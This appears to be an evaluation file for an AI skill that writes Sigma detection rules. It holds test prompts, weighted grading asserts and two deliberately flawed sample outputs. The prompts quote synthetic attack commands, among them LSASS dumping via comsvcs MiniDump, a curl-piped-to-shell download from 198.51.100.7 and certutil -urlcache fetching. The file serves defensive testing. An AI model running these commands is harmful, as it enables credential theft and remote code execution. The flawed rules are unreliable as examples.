@@ -1,0 +1,196 @@
+# Fabric SigmaRules — Sigma detection rules from a report, a technique, a
+# question or a platform hint. The code asserts pin the literal shape (titled
+# sections with header and footer, Sigma fields, source-specific strings); the
+# judged asserts carry what code cannot: fidelity to the source, behavioral
+# detection, real fields and a coherent condition. SigmaRulesCheck.ts is the
+# full parser-backed check the intent runs before delivery.
+# Synthetic inline fixtures only: every actor, host, path and address is invented
+# (addresses from the documentation ranges 198.51.100.0/24 and 203.0.113.0/24).
+name: fabric-sigmarules
+type: capability
+pass_threshold: 0.75
+trials: 3
+subject_timeout_ms: 180000
+system_prompt_file: "~/.claude/skills/Fabric/Intents/SigmaRules.md"
+cases:
+  - id: report_ttps_become_rules
+    prompt: 'create_sigma_rules for this report: "The fictional actor Copper Lantern sent fake invoices carrying an HTA attachment. When opened, mshta.exe launched powershell.exe -nop -w hidden -enc followed by a base64 blob that fetched a loader. The loader created a scheduled task with schtasks /create /sc minute /mo 30 /tn UpdaterSvcCheck /tr C:\ProgramData\updsvc.exe. Days later the operators dumped LSASS with rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\ProgramData\lsass.dmp full, then sent archives to 203.0.113.50 over HTTPS."'
+    # SYNTHETIC ADVERSARIAL FIXTURE: right sections, fields and keywords, but the
+    # comsvcs and mshta behavior lives only in descriptions; the detections key
+    # on an IP and on every schtasks run, so none catches the report's TTPs.
+    adversarial_output: |
+      #### Sigma Rule: Copper Lantern LSASS Dump via Comsvcs
+      ```yaml
+      title: Copper Lantern LSASS Dump via Comsvcs
+      id: 1f2e3d4c-5b6a-4978-8a1b-2c3d4e5f6a7b
+      status: experimental
+      description: Detects the comsvcs MiniDump of LSASS described in the report, launched after mshta.
+      date: 2026-01-15
+      logsource:
+        category: network_connection
+        product: windows
+      detection:
+        selection:
+          DestinationIp: '203.0.113.50'
+        condition: selection
+      falsepositives:
+        - Unknown
+      level: high
+      tags:
+        - attack.credential_access
+        - attack.t1003.001
+      ```
+      #### End of Sigma Rule
+
+      #### Sigma Rule: Copper Lantern UpdaterSvcCheck Task
+      ```yaml
+      title: Copper Lantern UpdaterSvcCheck Task
+      id: 2a3b4c5d-6e7f-4a8b-9c0d-1e2f3a4b5c6d
+      status: experimental
+      description: Detects the UpdaterSvcCheck persistence task.
+      date: 2026-01-15
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        selection:
+          Image|endswith: '\schtasks.exe'
+        condition: selection
+      falsepositives:
+        - Unknown
+      level: high
+      tags:
+        - attack.persistence
+        - attack.t1053.005
+      ```
+      #### End of Sigma Rule
+    assert:
+      - type: regex
+        weight: 2
+        value: '(?:^|\n)#### Sigma Rule: \S[^\n]*\n```ya?ml\n'
+      - type: contains
+        weight: 2
+        value: "#### End of Sigma Rule"
+      - type: regex
+        weight: 1
+        value: '\n\s+condition:\s*\S'
+      - type: icontains
+        weight: 1
+        value: "comsvcs"
+      - type: icontains
+        weight: 1
+        value: "UpdaterSvcCheck"
+      - type: icontains
+        weight: 1
+        value: "mshta"
+      - type: not-icontains
+        weight: 1
+        value: "your name"
+      - type: llm-assert
+        weight: 4
+        value: [ "There is a rule whose detection selection matches rundll32 invoking comsvcs.dll with MiniDump on the command line (LSASS credential dumping), not only a description that mentions it", "There is a rule whose detection matches mshta.exe spawning powershell.exe or an encoded hidden PowerShell command line", "The scheduled task rule matches the UpdaterSvcCheck task name or the schtasks /create command line from the report, rather than every schtasks execution", "Each host behavior in the report (the mshta launch, the scheduled task, the comsvcs dump) has its own behavior rule, and any rule keyed on 203.0.113.50 is described as an indicator rule rather than as detecting one of those behaviors", "The false positives listed are specific legitimate activities, not just Unknown" ]
+        reference: 'create_sigma_rules for this report: "The fictional actor Copper Lantern sent fake invoices carrying an HTA attachment. When opened, mshta.exe launched powershell.exe -nop -w hidden -enc followed by a base64 blob that fetched a loader. The loader created a scheduled task with schtasks /create /sc minute /mo 30 /tn UpdaterSvcCheck /tr C:\ProgramData\updsvc.exe. Days later the operators dumped LSASS with rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\ProgramData\lsass.dmp full, then sent archives to 203.0.113.50 over HTTPS."'
+
+  - id: technique_means_how_attackers_do_it
+    prompt: "create sigma rules for shadow copy deletion"
+    # SYNTHETIC ADVERSARIAL FIXTURE: right layout, tags and tool names, but the
+    # condition names a filter the detection never defines, and the selection
+    # matches the benign "list shadows" instead of any deletion.
+    adversarial_output: |
+      #### Sigma Rule: Shadow Copy Deletion via Vssadmin
+      ```yaml
+      title: Shadow Copy Deletion via Vssadmin
+      id: 3b4c5d6e-7f8a-4b9c-8d0e-1f2a3b4c5d6e
+      status: experimental
+      description: Detects vssadmin, wmic or wbadmin used to remove shadow copies before ransomware encryption.
+      date: 2026-01-15
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        selection:
+          Image|endswith: '\vssadmin.exe'
+          CommandLine|contains: 'list shadows'
+        condition: selection and not filter
+      falsepositives:
+        - Backup software managing its own snapshots
+      level: high
+      tags:
+        - attack.impact
+        - attack.t1490
+      ```
+      #### End of Sigma Rule
+    assert:
+      - type: regex
+        weight: 2
+        value: '(?:^|\n)#### Sigma Rule: \S[^\n]*\n```ya?ml\n'
+      - type: contains
+        weight: 2
+        value: "#### End of Sigma Rule"
+      - type: contains-any
+        weight: 1
+        value: [ "vssadmin", "wmic", "wbadmin" ]
+      - type: icontains
+        weight: 1
+        value: "attack.t1490"
+      - type: llm-assert
+        weight: 4
+        value: [ "The rules match the deletion forms attackers use (vssadmin delete shadows, wmic shadowcopy delete, or similar such as resizing shadow storage or wbadmin delete catalog), not benign listing commands", "Every name used in each rule's condition is defined as a selection or filter in that rule's detection", "The rules cover more than one of the common ways to delete shadow copies, either in one rule or across several" ]
+        reference: "create sigma rules for shadow copy deletion"
+
+  - id: platform_hint_overrides_windows
+    prompt: 'create_sigma_rules for this, for Linux: "A fictional cryptomining campaign got a shell on web servers, ran curl -s http://198.51.100.7/x.sh | sh, added a crontab line that re-downloads the script every 10 minutes, and ran pkill -f against competing miners named kdevtmpfsi and kinsing."'
+    assert:
+      - type: regex
+        weight: 2
+        value: '(?:^|\n)#### Sigma Rule: \S[^\n]*\n```ya?ml\n'
+      - type: regex
+        weight: 2
+        value: 'product:\s*linux'
+      - type: not-regex
+        weight: 2
+        value: 'product:\s*windows'
+      - type: llm-assert
+        weight: 4
+        value: [ "The rules use Linux logsources and fields that exist in Linux process or auditd events, with no Windows fields such as ParentImage paths ending in .exe", "The rules cover the curl piped into a shell, the crontab persistence, and the killing of competing miners (kdevtmpfsi or kinsing)", "Each rule's ATT&CK tags fit the behavior it detects" ]
+        reference: 'create_sigma_rules for this, for Linux: "A fictional cryptomining campaign got a shell on web servers, ran curl -s http://198.51.100.7/x.sh | sh, added a crontab line that re-downloads the script every 10 minutes, and ran pkill -f against competing miners named kdevtmpfsi and kinsing."'
+
+  - id: question_answered_with_rules
+    prompt: "create_sigma_rules: how would I catch someone adding a user to the local Administrators group with net.exe?"
+    assert:
+      - type: regex
+        weight: 2
+        value: '(?:^|\n)#### Sigma Rule: \S[^\n]*\n```ya?ml\n'
+      - type: contains
+        weight: 2
+        value: "#### End of Sigma Rule"
+      - type: icontains
+        weight: 1
+        value: "localgroup"
+      - type: regex
+        weight: 1
+        value: 'attack\.t1098|attack\.t1136'
+      - type: llm-assert
+        weight: 4
+        value: [ "The answer is delivered as Sigma rules, with no prose explanation outside the rule sections", "A rule matches net.exe or net1.exe with localgroup, administrators and /add on the command line", "The false positives name specific legitimate activity such as IT provisioning scripts or helpdesk administration" ]
+        reference: "create_sigma_rules: how would I catch someone adding a user to the local Administrators group with net.exe?"
+
+  - id: thin_report_stays_on_its_evidence
+    prompt: 'create_sigma_rules for this: "A fictional vendor blog says an unnamed group may have used certutil.exe -urlcache -split -f to pull a file named svcupd.dat into C:\Users\Public\, and that infected hosts then reached 198.51.100.23 on port 8443. Nothing else about the intrusion was confirmed."'
+    assert:
+      - type: regex
+        weight: 2
+        value: '(?:^|\n)#### Sigma Rule: \S[^\n]*\n```ya?ml\n'
+      - type: icontains
+        weight: 1
+        value: "urlcache"
+      - type: not-icontains
+        weight: 1
+        value: "verifyctl"
+      - type: contains
+        weight: 1
+        value: "198.51.100.23"
+      - type: llm-assert
+        weight: 4
+        value: [ "The certutil rule matches the -urlcache download form the report gives and adds no other certutil flag or download tool the report never mentions", "There is a network_connection or similar endpoint rule for 198.51.100.23 on port 8443, described as an indicator rule, rather than the connection being dropped or listed as not covered", "No rule is rated high or critical, since the report says the activity is unconfirmed", "The output names where the report is too thin, such as the missing process behind the connection or what svcupd.dat does" ]
+        reference: 'create_sigma_rules for this: "A fictional vendor blog says an unnamed group may have used certutil.exe -urlcache -split -f to pull a file named svcupd.dat into C:\Users\Public\, and that infected hosts then reached 198.51.100.23 on port 8443. Nothing else about the intrusion was confirmed."'
